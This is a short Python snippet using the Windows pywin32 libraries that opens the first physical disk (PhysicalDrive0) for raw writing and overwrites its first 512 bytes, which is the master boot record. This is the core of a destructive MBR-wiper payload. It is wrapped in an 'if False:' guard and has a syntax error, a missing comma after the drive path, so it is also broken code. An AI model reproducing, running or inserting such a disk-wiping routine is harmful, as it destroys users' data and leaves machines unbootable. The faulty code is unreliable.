from win32gui import *
from win32ui import *
from win32con import *
from win32file import *

if False:
    hDevice = CreateFileW("\\\\.\\PhysicalDrive0"
                            GENERIC_WRITE,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            None,
                            OPEN_EXISTING,
                            0,0
                            )
    WriteFile(hDevice,      
                            AllocateReadBuffer(512),
                            None
                            )
    CloseHandle(hDevice)